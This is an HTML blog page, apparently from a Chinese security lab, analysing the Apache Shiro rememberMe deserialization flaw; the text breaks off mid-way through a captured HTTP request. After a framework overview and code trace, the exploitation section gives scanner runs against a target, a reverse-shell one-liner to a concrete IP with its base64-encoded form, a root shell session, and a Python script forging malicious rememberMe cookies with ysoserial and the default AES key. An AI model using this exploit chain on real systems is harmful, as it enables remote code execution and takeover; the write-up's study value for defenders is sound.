@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html>
+<style>
+.navbar-hide{
+	display: none;
+}
+</style>
+	<head>
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="© 关于哨兵，这是一个与哨兵安全相关的简述。">
+<meta name="keywords" content="网络安全,哨兵安全,Cyber Security,Open Source">
+<meta name="author" content="Sentry Security">
+<link rel="shortcut icon" href="/static/img/favicon.png">
+<title> ShiroDeser  © 关于哨兵 | 哨兵安全实验室</title>
+<!--<base target="_blank" />-->
+<link rel="stylesheet" href="/static/css/bootstrap.css">
+<link rel="stylesheet" href="/static/css/bootstrap-select.min.css">
+<link rel="stylesheet" href="/static/css/font-awesome.min.css" >
+<link rel="stylesheet" href="/static/css/spinkit.css">
+<link rel="stylesheet" href="/static/css/style.css">
+<link rel="stylesheet" type="text/css" href="/static/css/pace-minimal.css">
+
+<script src="/static/js/jquery.min.js"></script>
+<!--jquery sticky js source files add-->
+<script src="/static/js/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+<script type="text/javascript" src="/static/js/jquery.sticky/1.0.4/jquery.sticky.js"></script>
+<!--jquery sticky js source files add stop-->
+<script src="/static/js/bootstrap.min.js"></script>
+<script src="/static/js/bootstrap-select.min.js"></script>
+<script src="/static/js/pace.min.js"></script>
+
+<!--start-->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$$','$$']]
+      }
+    });
+  </script>
+<script src="/static/js/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
+<!--https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js shuxue gongshi. stop-->
+
+<script src="/static/js/vue.min.js"></script>
+<script src="/static/js/timeago.min.js"></script>
+
+<script src="/static/js/markup.min.js"></script>
+<script src="/static/js/webfont.js"></script>
+<script src="/static/js/thuhidden.js"></script>
+
+</head>
+
+<body>
+	<div class="navbar navbar-default" role="navigation">
+  <div class="container">
+    <div class="navbar-header">
+      
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      
+			<a class="navbar-brand" href="/">
+				<span class="thuhidden">
+					
+					<picture>
+						
+						<source 
+						
+							srcset="/static/img/logo-small-dark.png 1x,
+											/static/img/logo-small-dark@2x.png 2x,
+											/static/img/logo-small-dark@3x.png 3x,
+											/static/img/logo-small-dark@4x.png 4x"
+						
+							media="(prefers-color-scheme: dark)"/>
+						
+						
+						<img src="/static/img/logo-small.png" 
+							srcset="/static/img/logo-small.png 1x, 
+											/static/img/logo-small@2x.png 2x, 
+											/static/img/logo-small@3x.png 3x, 
+											/static/img/logo-small@4x.png 4x"
+							alt=""/>
+						
+					</picture>
+					
+					</span>关于我的一些自述
+			</a>
+    </div>
+    <div class="navbar-collapse collapse navbar-right">
+      <ul class="nav navbar-nav" role="menubar">
+        
+        
+        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn">HOME</a></li>
+        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/blog">BLOG</a></li>
+        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/events">EVENT</a></li>
+        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/categories">CATEGORIES</a></li>
+        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/daily">DAILY</a></li>
+        <li class="active"><a href="/">ABOUT ME</a></li>
+
+        
+       
+      </ul>
+    </div><!--/.nav-collapse -->
+  </div>
+</div>
+
+
+
+
+<script>
+	window.mirrorId = "ShiroDeser";
+</script>
+
+
+<div id="help-page">
+	<div class="container">
+	  <div class="row">
+		  <div class="col-sm-3 hidden-xs">
+				<ul class="nav nav-pills nav-stacked" id="help-nav">
+					
+					<li id="toc-ATT&CK - 基于 scylla 的访问代理池"><a href="/help/Thousand-people-Thousand-faces-Red-team-penetration-agent-pool-based-on-scylla/"><code-index-css>ATT&CK - 基于 scylla 的访问代理池</code-index-css></a></li>
+					
+					<li id="toc-CTF - 代码审计向"><a href="/help/CTF-Code-Audit-WalkThrough/"><code-index-css>CTF - 代码审计向</code-index-css></a></li>
+					
+					<li id="toc-CTF - 密码学与杂项"><a href="/help/CTF-Crypto-and-Misc-etc-WalkThrough/"><code-index-css>CTF - 密码学与杂项</code-index-css></a></li>
+					
+					<li id="toc-Dynamic-analysis-of-java-framework-code"><a href="/help/Dynamic-analysis-of-java-framework-code/"><code-index-css>Dynamic-analysis-of-java-framework-code</code-index-css></a></li>
+					
+					<li id="toc-Hikvision-ConfigurationFiles-decrypter"><a href="/help/Hikvision-ConfigurationFiles-decrypter/"><code-index-css>Hikvision-ConfigurationFiles-decrypter</code-index-css></a></li>
+					
+					<li id="toc-JRMP-Gadget"><a href="/help/JRMP-Gadget/"><code-index-css>JRMP-Gadget</code-index-css></a></li>
+					
+					<li id="toc-Mod-Waf-Bypass-Walkthrough"><a href="/help/Mod-Waf-Bypass-Walkthrough/"><code-index-css>Mod-Waf-Bypass-Walkthrough</code-index-css></a></li>
+					
+					<li id="toc-ModSec & CloudFlare WAF Initial Research"><a href="/help/WAF-developed-by-Grayscale-forwarding/"><code-index-css>ModSec & CloudFlare WAF Initial Research</code-index-css></a></li>
+					
+					<li id="toc-Router-BinFile-Analysis"><a href="/help/Router-BinFile-Analysis/"><code-index-css>Router-BinFile-Analysis</code-index-css></a></li>
+					
+					<li id="toc-SQL注入原理分析"><a href="/help/ALL-SQL-INJECTION-ANALYSIS/"><code-index-css>SQL注入原理分析</code-index-css></a></li>
+					
+					<li class="active" id="toc-ShiroDeser"><a href="/help/ShiroDeser/"><code-index-css>ShiroDeser</code-index-css></a></li>
+					
+					<li id="toc-SpringBoot-Memory-files-heapdump-Analysis"><a href="/help/SpringBoot-Memory-files-heapdump-Analysis/"><code-index-css>SpringBoot-Memory-files-heapdump-Analysis</code-index-css></a></li>
+					
+					<li id="toc-Struts2Deser"><a href="/help/Struts2Deser/"><code-index-css>Struts2Deser</code-index-css></a></li>
+					
+					<li id="toc-javaDeser"><a href="/help/javaDeser/"><code-index-css>javaDeser</code-index-css></a></li>
+					
+					<li id="toc-polkit-CVE-2021-3560"><a href="/help/polkit-CVE-2021-3560/"><code-index-css>polkit-CVE-2021-3560</code-index-css></a></li>
+					
+					<li id="toc-基于内存的Shiro框架Webshell攻击研究"><a href="/help/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/"><code-index-css>基于内存的Shiro框架Webshell攻击研究</code-index-css></a></li>
+					
+					<li id="toc-安全与开发之：Maven构建排错"><a href="/help/ALL-mvn-build-errors/"><code-index-css>安全与开发之：Maven构建排错</code-index-css></a></li>
+					
+					<li id="toc-浪潮ClusterEngineV4.0代码审计历程"><a href="/help/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/"><code-index-css>浪潮ClusterEngineV4.0代码审计历程</code-index-css></a></li>
+					
+					<li id="toc-通达OA利用代码分析"><a href="/help/ToDa-OA-VulnPoc-by-java-analysis/"><code-index-css>通达OA利用代码分析</code-index-css></a></li>
+					
+				</ul>
+				
+				
+				<div id="sticky-wrapper" class="sticky-wrapper" style="height: 200px;">
+					<li class="nav nav-pills nav-stacked" id="help-nav">
+						<code-index-css>
+							<details open class="article-index" style="overflow: visible;">
+								<summary class="point">文章目录&nbsp &nbsp</summary>
+								<div class="hline"></div>
+								<div class="spacing"></div>
+								<ul id="toc" class="section-nav">
+<li class="toc-entry toc-h1"><a href="#分享different-shiro-framework-deserialization-analysis-ideas">分享：Different Shiro Framework deserialization analysis ideas</a></li>
+<li class="toc-entry toc-h1"><a href="#零shiro框架的简介和相关用途">零：Shiro框架的简介和相关用途</a>
+<ul>
+<li class="toc-entry toc-h2"><a href="#0x01简介">0x01：简介</a></li>
+<li class="toc-entry toc-h2"><a href="#0x02用途">0x02：用途</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h1"><a href="#一shiro框架反序列化的原因">一：Shiro框架反序列化的原因</a>
+<ul>
+<li class="toc-entry toc-h2"><a href="#1x01shiro代码层分析">1x01：Shiro代码层分析</a>
+<ul>
+<li class="toc-entry toc-h4"><a href="#---左键单击-securityutils-跳转shiro-core-124jarorgapacheshirosecurityutilsclass">  ⌘+ 左键单击 SecurityUtils 跳转shiro-core-1.2.4.jar!/org/apache/shiro/SecurityUtils.class</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#1x02为什么这么写">1x02：为什么这么写</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h1"><a href="#%E6%9B%B4%E6%96%B0%E4%B8%AD">更新中...</a></li>
+<li class="toc-entry toc-h1"><a href="#二验证">二：验证</a>
+<ul>
+<li class="toc-entry toc-h2"><a href="#2x01getshell">2x01：getshell</a></li>
+<li class="toc-entry toc-h2"><a href="#2x02学习工具">2x02：学习工具</a></li>
+<li class="toc-entry toc-h2"><a href="#2x03how-to-poc">2x03：how to poc</a></li>
+<li class="toc-entry toc-h2"><a href="#案例">案例</a></li>
+</ul>
+</li>
+</ul>
+							</details>
+						</code-index-css>
+					</li>
+				</div>
+				 
+
+
+				<!--click this icon -> scroll to top of page; code from anquanke. also this icon func are under-construction-->		
+				<!-- <div class="back-to-top" onclick="$(&quot;html,body&quot;).animate({scrollTop:0}, 500);" style="position: fixed;bottom:400px;right: 20px;height: 40px;width: 40px;background-color: #1dada7;border-radius: 50%;text-align: center;cursor: pointer">
+					<img src="https://p0.ssl.qhimg.com/t0179ac3294ef926b8c.png" style="width:30px;margin-top: 6px;">
+				</div> -->
+
+
+			</div><!-- sidenave -->
+			<div class="col-sm-9">
+				<div class="visible-xs">
+					<form class="form-inline">
+						<div class="form-group">
+							<label>选择: </label>
+							<select class="form-control" id="help-select">
+								
+								<option data-help-url="/help/Thousand-people-Thousand-faces-Red-team-penetration-agent-pool-based-on-scylla/" id="toc-ATT&CK - 基于 scylla 的访问代理池">ATT&CK - 基于 scylla 的访问代理池</option>
+								
+								<option data-help-url="/help/CTF-Code-Audit-WalkThrough/" id="toc-CTF - 代码审计向">CTF - 代码审计向</option>
+								
+								<option data-help-url="/help/CTF-Crypto-and-Misc-etc-WalkThrough/" id="toc-CTF - 密码学与杂项">CTF - 密码学与杂项</option>
+								
+								<option data-help-url="/help/Dynamic-analysis-of-java-framework-code/" id="toc-Dynamic-analysis-of-java-framework-code">Dynamic-analysis-of-java-framework-code</option>
+								
+								<option data-help-url="/help/Hikvision-ConfigurationFiles-decrypter/" id="toc-Hikvision-ConfigurationFiles-decrypter">Hikvision-ConfigurationFiles-decrypter</option>
+								
+								<option data-help-url="/help/JRMP-Gadget/" id="toc-JRMP-Gadget">JRMP-Gadget</option>
+								
+								<option data-help-url="/help/Mod-Waf-Bypass-Walkthrough/" id="toc-Mod-Waf-Bypass-Walkthrough">Mod-Waf-Bypass-Walkthrough</option>
+								
+								<option data-help-url="/help/WAF-developed-by-Grayscale-forwarding/" id="toc-ModSec & CloudFlare WAF Initial Research">ModSec & CloudFlare WAF Initial Research</option>
+								
+								<option data-help-url="/help/Router-BinFile-Analysis/" id="toc-Router-BinFile-Analysis">Router-BinFile-Analysis</option>
+								
+								<option data-help-url="/help/ALL-SQL-INJECTION-ANALYSIS/" id="toc-SQL注入原理分析">SQL注入原理分析</option>
+								
+								<option data-help-url="/help/ShiroDeser/" selected id="toc-ShiroDeser">ShiroDeser</option>
+								
+								<option data-help-url="/help/SpringBoot-Memory-files-heapdump-Analysis/" id="toc-SpringBoot-Memory-files-heapdump-Analysis">SpringBoot-Memory-files-heapdump-Analysis</option>
+								
+								<option data-help-url="/help/Struts2Deser/" id="toc-Struts2Deser">Struts2Deser</option>
+								
+								<option data-help-url="/help/javaDeser/" id="toc-javaDeser">javaDeser</option>
+								
+								<option data-help-url="/help/polkit-CVE-2021-3560/" id="toc-polkit-CVE-2021-3560">polkit-CVE-2021-3560</option>
+								
+								<option data-help-url="/help/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/" id="toc-基于内存的Shiro框架Webshell攻击研究">基于内存的Shiro框架Webshell攻击研究</option>
+								
+								<option data-help-url="/help/ALL-mvn-build-errors/" id="toc-安全与开发之：Maven构建排错">安全与开发之：Maven构建排错</option>
+								
+								<option data-help-url="/help/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/" id="toc-浪潮ClusterEngineV4.0代码审计历程">浪潮ClusterEngineV4.0代码审计历程</option>
+								
+								<option data-help-url="/help/ToDa-OA-VulnPoc-by-java-analysis/" id="toc-通达OA利用代码分析">通达OA利用代码分析</option>
+								
+							</select>
+						</div>
+					</form>
+				</div>
+				<div id="help-content">
+
+				<center>
+					
+					<csmall>本文最后修改于：<em>2020-05-18</em></csmall>
+					
+				<csmall><em> | Sentry Security | 哨兵安全实验室</em></csmall>
+				</center>
+
+					<div class="hline"></div>
+					<div class="spacing"></div>
+
+					<h1 id="分享different-shiro-framework-deserialization-analysis-ideas">分享：Different Shiro Framework deserialization analysis ideas</h1>
+
+<p><strong>写在文前：</strong></p>
+
+<p>本文是我自己在实践中的一些理解和经历，希望能够记录下来；
+第一小结是后期在自己对这个框架有一定的认知后做的总结，修改记录可以看下面，第二小结是在学习中在网上的一些学习过程，当时也记录下来了。
+故此分为两个小结。</p>
+
+<p><strong>——致勤奋的所有人</strong></p>
+
+<table class="table">
+  <thead>
+    <tr>
+      <th>不一样的SHIRO框架浅析思路梳理</th>
+      <th> </th>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>SHIRO框架简介以及相关用途</td>
+      <td>反序列化分析</td>
+      <td>为什么写这样的代码</td>
+      <td>反序列化实战</td>
+    </tr>
+    <tr>
+      <td>✅简介：关于SHIRO的历史和相关实现组件</td>
+      <td>✅ JAVA代码反序列化FRAMES</td>
+      <td>❎开发者写这样代码的用意</td>
+      <td>✅利用GADGET生成COOKIE</td>
+    </tr>
+    <tr>
+      <td>✅用途：SHIRO框架的使用场景和解决痛点</td>
+      <td>✅ <a href="/help/Dynamic-analysis-of-java-framework-code/">调试环境部署</a></td>
+      <td>❎开发者如何修复</td>
+      <td>✅最终目标：GETSHELL</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p>本文初次记于2020/05/18；
+再次修改于2021/01/04上午；</p>
+
+<ul>
+  <li>添加了文章目录；</li>
+  <li>在原先文章基础不变的情况下，调整了整体文章的阐述框架，添加如下：
+    <ul>
+      <li>技术分析；</li>
+      <li>开发分析。</li>
+    </ul>
+  </li>
+</ul>
+
+<h1 id="零shiro框架的简介和相关用途">零：Shiro框架的简介和相关用途</h1>
+
+<p><img src="/static/web-image/Apache_Shiro_Logo.png#pic_center" alt="Alt" /></p>
+
+<hr />
+
+<p><strong>Apache Shiro（读作“sheeroh”，即日语“城”）是一个开源安全框架，提供身份验证、授权、密码学和会话管理。</strong>
+<strong>Shiro框架直观、易用，同时也能提供健壮的安全性。</strong></p>
+
+<p>————来自于<a href="https://zh.wikipedia.org/wiki/Apache_Shiro" target="_blank">维基百科</a></p>
+
+<h2 id="0x01简介">0x01：简介</h2>
+
+<p><strong>Shiro</strong>三个核心组件：<strong>Subject</strong>, <strong>SecurityManager</strong> 和 <strong>Realms</strong>.</p>
+
+<ul>
+  <li>
+    <p>Subject：即“当前操作用户”。但是，在Shiro中，Subject这一概念并不仅仅指人，也可以是第三方进程、后台帐户（Daemon Account）或其他类似事物。它仅仅意味着“当前跟软件交互的东西”。
+Subject代表了当前用户的安全操作，SecurityManager则管理所有用户的安全操作。</p>
+  </li>
+  <li>
+    <p>SecurityManager：它是Shiro框架的核心，典型的Facade模式，Shiro通过SecurityManager来管理内部组件实例，并通过它来提供安全管理的各种服务。</p>
+  </li>
+  <li>
+    <p>Realm： Realm充当了Shiro与应用安全数据间的“桥梁”或者“连接器”。也就是说，当对用户执行认证（登录）和授权（访问控制）验证时，Shiro会从应用配置的Realm中查找用户及其权限信息。</p>
+  </li>
+</ul>
+
+<p><del>从这个意义上讲，Realm实质上是一个安全相关的DAO：它封装了数据源的连接细节，并在需要时将相关数据提供给Shiro。</del>
+<del>当配置Shiro时，你必须至少指定一个Realm，用于认证和（或）授权。配置多个Realm是可以的，但是至少需要一个。</del>
+<del>Shiro内置了可以连接大量安全数据源（又名目录）的Realm，如LDAP、关系数据库（JDBC）、类似INI的文本配置资源以及属性文件等。如果系统默认的Realm不
+能满足需求，你还可以插入代表自定义数据源的自己的Realm实现。</del></p>
+
+<h2 id="0x02用途">0x02：用途</h2>
+
+<blockquote>
+  <p>Apache Shiro是Java的一个安全框架。Shiro可以非常容易的开发出足够好的应用，其不仅可以用在JavaSE环境，也可以用在JavaEE环境，
+Shiro可以帮助我们完成：认证、授权、加密、会话管理、与Web集成、缓存等。</p>
+</blockquote>
+
+<p>上面说的比较官方一点，我们可以简单一点理解，她就是一个<code class="language-plaintext highlighter-rouge">开源的集成权限框架</code>，这是我们在市面上很多的应用。我们在漏洞挖掘的过程中，如果存在WEB验证机制，
+有可能会存在登录绕过，所以</p>
+
+<p><strong>现在很多j2ee开发都会采用shiro框架来做权限控制，框架的优势是十分明显的，但凡事有利有弊，有优势当然就存在劣势。shiro是我在参加工作后才会慢慢去接触到；
+从一开始的代审，再到黑盒渗透，再到前一段时间刚结束的HW行动。</strong></p>
+
+<blockquote>
+  <p>目前，使用Apache Shiro的人越来越多，因为它<strong>相当简单</strong>，对比Spring Security，
+可能没有Spring Security做的功能强大，但是在实际工作时可能并不需要那么复杂的东西，所以使用小而简单的Shiro就足够了。
+对于它俩到底哪个好，这个不必纠结，能更简单的解决项目问题就好了。</p>
+</blockquote>
+
+<h1 id="一shiro框架反序列化的原因">一：Shiro框架反序列化的原因</h1>
+
+<p><code class="language-plaintext highlighter-rouge">return rmm.getRememberedPrincipals(subjectContext);</code></p>
+
+<h2 id="1x01shiro代码层分析">1x01：Shiro代码层分析</h2>
+
+<ul>
+  <li><strong>web.xml</strong></li>
+</ul>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;welcome-file-list&gt;</span>
+    <span class="nt">&lt;welcome-file&gt;</span>index.jsp<span class="nt">&lt;/welcome-file&gt;</span>
+<span class="nt">&lt;/welcome-file-list&gt;</span>
+</code></pre></div></div>
+
+<p>代码大致逻辑：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nl">jsp:</span><span class="n">forward</span> <span class="n">page</span><span class="o">=</span><span class="s">"home.jsp"</span><span class="o">/&gt;</span>
+<span class="c1">//跳到home.jsp home页面包含include.jsp</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">include</span> <span class="n">file</span><span class="o">=</span><span class="s">"include.jsp"</span> <span class="o">%&gt;</span>
+<span class="c1">//include.jsp导入SecurityUtils类</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="kn">import</span><span class="err">="</span><span class="nn">org.apache.shiro.SecurityUtils</span><span class="err">"</span> <span class="o">%&gt;</span>
+</code></pre></div></div>
+
+<h4 id="---左键单击-securityutils-跳转shiro-core-124jarorgapacheshirosecurityutilsclass"><a href="#"> <i class="fa fa-hand-o-down"></i></a> <kbd>⌘</kbd>+ 左键单击 <code class="language-plaintext highlighter-rouge">SecurityUtils</code> 跳转<code class="language-plaintext highlighter-rouge">shiro-core-1.2.4.jar!/org/apache/shiro/SecurityUtils.class</code></h4>
+<p>那么我们假设SecurityUtils类是shiro框架认证入口，那么我们只需要梳理清楚对应代码逻辑即可；</p>
+
+<p>参考</p>
+
+<ul>
+  <li>https://www.jianshu.com/p/ccd0b79db702</li>
+  <li>https://blog.csdn.net/w1196726224/article/details/53560385</li>
+</ul>
+
+<p>先直接在home.jsp页面处下断点，处理流程大概如下：</p>
+<ul>
+  <li>JavaServer Pages：
+    <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">_jspService</span><span class="o">(</span><span class="nc">HttpServletRequest</span><span class="o">,</span> <span class="nc">HttpServletResponse</span><span class="o">):</span><span class="mi">21</span><span class="o">,</span> <span class="n">index_jsp</span>
+  <span class="c1">//正常jsp server请求</span>
+  <span class="n">service</span><span class="o">(</span><span class="nc">HttpServletRequest</span><span class="o">,</span> <span class="nc">HttpServletResponse</span><span class="o">):</span><span class="mi">71</span><span class="o">,</span> <span class="nc">HttpJspBase</span>
+  <span class="c1">//server响应request，返回JSESSIONID</span>
+  <span class="n">service</span><span class="o">(</span><span class="nc">ServletRequest</span><span class="o">,</span> <span class="nc">ServletResponse</span><span class="o">):</span><span class="mi">733</span><span class="o">,</span> <span class="nc">HttpServlet</span>
+  <span class="c1">//以返回的JSESSIONID COOKIE访问http://127.0.0.1:8080/shiro/account</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Server Applet
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  httpServerlet
+</code></pre></div>    </div>
+  </li>
+  <li>Shiro web Serverlet
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ShiroHttpServletRequest
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>web http访问后，访问调用如下：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>this <span class="o">=</span> <span class="o">{</span>index_jsp@4030<span class="o">}</span> 
+request <span class="o">=</span> <span class="o">{</span>ShiroHttpServletRequest@5282<span class="o">}</span> 
+response <span class="o">=</span> <span class="o">{</span>ResponseFacade@4532<span class="o">}</span> 
+_jspx_method <span class="o">=</span> <span class="s2">"GET"</span>
+out <span class="o">=</span> <span class="o">{</span>JspWriterImpl@5284<span class="o">}</span>
+_jspx_out <span class="o">=</span> <span class="o">{</span>JspWriterImpl@5284<span class="o">}</span> 
+_jspx_page_context <span class="o">=</span> <span class="o">{</span>PageContextImpl@5285<span class="o">}</span> 
+pageContext <span class="o">=</span> <span class="o">{</span>PageContextImpl@5285<span class="o">}</span> 
+</code></pre></div></div>
+<p>基本上就是这个流程；</p>
+<h2 id="1x02为什么这么写">1x02：为什么这么写</h2>
+
+<h1>更新中...</h1>
+
+<h1 id="二验证">二：验证</h1>
+<p>在上面的简述中，可以来进行shiro框架的判断漏洞特征：</p>
+
+<ul>
+  <li>1.在返回包的Set-Cookie的值为「rememberMe=deleteMe」；</li>
+  <li>2.JESSession Cookie.实际渗透中如果遇到可以尝试加入rememberMe Cookie探测是否使用shiro框架；</li>
+  <li>3.特定CMS集成shiro框架；
+    <ul>
+      <li>1）jeesite</li>
+      <li>2）iBase4J</li>
+      <li>等等</li>
+    </ul>
+  </li>
+</ul>
+
+<p>同时，我们可以进一步对shiro框架是否存在反序列化来进行验证：
+用到的是<a href="http://www.svenbeast.com/post/tskRKJIPg/" target="_blank">Shiroscan by 斯文</a>脚本，开源在github上，用法就不多赘述。</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 shiro_rce.py https://shiro.vuln.ip/login.html <span class="s2">"ping x.dnslog.cn"</span>
+ ____  _     _          ____                  
+/ ___|| |__ <span class="o">(</span>_<span class="o">)</span>_ __ ___/ ___|  ___ __ _ _ __  
+<span class="se">\_</span>__ <span class="se">\|</span> <span class="s1">'_ \| | '</span>__/ _ <span class="se">\_</span>__ <span class="se">\ </span>/ __/ _<span class="sb">`</span> | <span class="s1">'_ \ 
+ ___) | | | | | | | (_) |__) | (_| (_| | | | |
+|____/|_| |_|_|_|  \___/____/ \___\__,_|_| |_|
+
+                           By 斯文
+
+Welcome To Shiro反序列化 RCE ! 
+[*]  开始检测模块 Class1:CommonsBeanutils1
+</span></code></pre></div></div>
+<p>然后脚本开始对不同的秘钥进行生成cookie，尝试让机器执行命令。等待脚本在跑的时候或者跑完，看一下dnslog上的dns记录，如果存在记录如下所示，那么就说明存在反序列化漏洞使得机器执行了任意代码，反之则无：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:46:35
+x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52
+x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52
+x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52
+</code></pre></div></div>
+<p>当然有的时候用shiroScan扫结束后并没有记录，即不存在漏洞；但是像我，又不死心，于是又在网上折腾找了另外一个能够跑秘钥的探测脚本-_-
+<a href="https://www.bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/" target="_blank">作者博客</a></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python shiro_exp.py https://shiro.vuln.ip/login.html
+try CipherKey :4AvVhmFLUs0KTA3Kprsdag<span class="o">==</span>
+generator payload <span class="k">done</span><span class="nb">.</span>
+send payload ok.
+checking.....
+checking.....
+checking.....
+checking.....
+vulnerable:true url:https://shiro.vuln.ip/login.html    CipherKey:3AvVhmFLUs0KTA3Kprsdag<span class="o">==</span>
+</code></pre></div></div>
+<p>当然秘钥对于我们理解shiro反序列化框架也有一定的帮助，shiro的反序列化最初的漏洞来源也是因为秘钥硬编码。</p>
+
+<h2 id="2x01getshell">2x01：getshell</h2>
+<p>通过上面的步骤我们就可以对shiro反序列化做一个判定，肯定是存在RCE漏洞，那么来实现我们的最终目的，GET-shell一般反弹shell的执行代码<code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/47.52.233.92/11111 0&gt;&amp;1</code>，首先需要把代码进行base64编码，只有经过base64编码后shiro才认得这个命令，通过shiro自己本身的base64解码最终达到执行命令的目的；
+转成base64编码-&gt;<code class="language-plaintext highlighter-rouge">bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}</code>；</p>
+
+<p>像我比较偷懒，就直接在脚本上添加反弹shell，这样的好处就是我们不需要在生成poc的脚本里替换cookie，由脚本自动生成的cookie自动去跑，省事很多
+<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank">我是转换网址:-)</a>
+监听端口等待shell回连（我这里的样例是docker环境）</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvvp 11111
+Listening on [0.0.0.0] (family 0, port 11111)
+Connection from 59.110.152.168 47274 received!
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@6d5a7848dbef:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></div>
+
+<h2 id="2x02学习工具">2x02：学习工具</h2>
+<p>使用ysoserial进行流量监听，下面是ysoserial的jar包生成，懂得开发同学都懂。</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/frohoff/ysoserial.git
+cd ysoserial
+mvn package -D skipTests
+</code></pre></div></div>
+
+<h2 id="2x03how-to-poc">2x03：how to poc</h2>
+<p>使用poc代码获得对应的rememberMe的cookie值。</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># -*- coding:utf-8 -*-
+import sys
+import uuid
+import base64
+import subprocess
+from Crypto.Cipher import AES
+
+def encode_rememberme(command):
+    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
+    BS = AES.block_size
+    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
+    iv = uuid.uuid4().bytes
+    encryptor = AES.new(key, AES.MODE_CBC, iv)
+    file_body = pad(popen.stdout.read())
+    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+    return base64_ciphertext
+
+if __name__ == '__main__':
+    payload = encode_rememberme(sys.argv[1])    
+print "rememberMe={0}".format(payload.decode())
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>D:\bin4xin\code\shiro\shrio-poc\ysoserial\target&gt; python .\shrio-poc.py 47.52.233.92:6666
+rememberMe=W8BOhPe8Qdy8FJ5N9genqt4WjZaONr1NQ+dXgDCV1RrGHUwMfd8ljlA9AG64t7vzUesOp7YKsz6EFFHgyrq1qRqUiPFBnEBi/NNNpE2UR8CgMsf1KY2rbBurFv1Gwslv2+SL7hy3YNq9cpPWm5S8o+nJpa6IyI9cZ+n7a+6hjB4Yfnf89u3BLi4AxOXL35SotH2AdSX2iZrWgGAcah9oW21JwpC2zj4YMjsGf2tPYUysP873bYYHuSIohaXf3bcq4YuQajMctVmM3IvjeY5Ggva9QRUvo5B1o0sPNHdXGwn/z9t/KWcSeTWE+Dt2f95a9QjEIoic6s88Tv0SKjY6UdCmTxN3vVE8rs1haiA48R1CuUQQiWa9V28m2qkonX9aUEUl4kTGGvF+Y5eB4MaNTw==
+</code></pre></div></div>
+
+<p>抓包，前台登录拦包，勾选<code class="language-plaintext highlighter-rouge">Remember Me</code>，截获数据包，替换cookie构造数据包：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /doLogin HTTP/1.1
+underattack-host: underattack-host:8080
+Content-Length: 55
+Cache-Control: max-age=0
+Origin: http://underattack-host:8080
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Content-Type: application/x-www-form-urlencoded
